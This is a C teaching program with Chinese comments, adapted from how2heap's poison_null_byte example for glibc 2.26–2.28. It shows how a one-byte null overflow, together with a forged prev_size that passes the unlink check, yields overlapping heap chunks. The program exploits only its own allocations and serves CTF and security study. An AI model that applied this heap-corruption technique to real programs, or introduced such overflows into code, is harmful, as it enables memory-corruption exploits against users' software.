/*
 * 中文导读（CTF 版）
 *
 * 手法：Poison Null Byte
 * 文件标注范围：glibc 2.26～2.28，x86-64 上游堆管理器。
 * 模拟漏洞：只能向相邻 chunk 的 size 字段最低字节写入一个空字节，
 *   也就是常说的 off-by-null。
 * 成功判据：最后一处 assert 证明新分配出来的 chunk 与仍在使用的 victim
 *   发生了重叠。
 *
 * 2.26 开始，unlink 会检查 chunksize(P)==prev_size(next_chunk(P))。这条链
 * 把尺寸放大到超出 largebin/tcache 上限，并在缩小后的 b 尾部提前伪造出
 * 一致的 next->prev_size 来满足这条检查；随后仍然利用 c 保留的陈旧
 * prev_size，制造出跨过 b2 的合并。
 *
 * 来源：shellphish/how2heap poison_null_byte.c；本目录按 glibc 源码边界
 * 重命名、补充中文导读并在对应运行时验证。程序故意包含 UAF、越界写
 * 和对已释放 chunk 的读取，只能用于 CTF/教学与授权研究。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;

	a = (uint8_t*) malloc(0x500);

	int real_a_size = malloc_usable_size(a);

	/*
	 * 被毒化 chunk 原本的 size 低字节不能已经是 0x00，否则 off-by-null 写
	 * 下去也不会改变有效尺寸。这里选择的请求值加上 header 后低字节正好是
	 * 0x10，空字节覆盖会把物理尺寸向下截短 0x10，同时把 PREV_INUSE 位一起
	 * 清掉。
	 */
	b = (uint8_t*) malloc(0xa00);

	c = (uint8_t*) malloc(0x500);

	malloc(0x100); // 保护块防止 c 与 top 合并。

	// 提交 17f487b 增加了 chunksize(P)==prev_size(next_chunk(P)) 的检查，
	// 所以这里要提前把截短之后的边界伪造好。
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// 也正因为有这个检查，攻击者必须能向 b 内部写入完整的机器字；如果只有
	// 遇到空字节就停止的字符串式写入，通常是做不到的。
	// 我们需要在截短后 next_chunk 所在的 b+0x9f0 处写入 prev_size=0xa00，
	// 下面这一行就是真正执行这次写入。off-by-null 会把 0xa11 截成 0xa00，
	// 所以只要在新 next_chunk 处写入同样的值，就能满足这条一致性检查。
	*(size_t*)(b+0x9f0) = 0xa00;

	// 先释放 b，再借助 a 的 off-by-null 去改这个 free chunk 记录的 size。
	free(b);

	a[real_a_size] = 0; // 漏洞触发点：越过 a 的用户区写一个字节，把 b->size 的最低字节清零。

	// 下一次 malloc 会对原来 b 所在的这个 free chunk 执行 unlink。提交
	// 17f487b 会核对 chunksize(P) 与 prev_size(next_chunk(P)) 是否一致；
	// 前面已经在截短后的新边界写好了相同的值，所以不会被判定为大小不一致
	// （即报错信息里的 corrupted size vs. prev_size）。
	// next_chunk(P) == b-0x10+0xa00 == b+0x9f0
	// prev_size(next_chunk(P)) == *(b+0x9f0) == 0xa00

	b1 = malloc(0x500);

	// 真实题目里的 b2 往往是包含函数指针、长度字段或对象指针的活动结构；
	// 一旦发生重叠，我们就能直接控制这些字段的值。

	b2 = malloc(0x480);

	memset(b2,'B',0x480);

	free(b1);
	free(c);

	d = malloc(0xc00);

	memset(d,'D',0xc00);

	assert(strstr((char *)b2, "DDDDDDDDDDDD")); // b2 仍在使用，却能读到 d 写入的内容，证明二者确实发生了重叠。
}
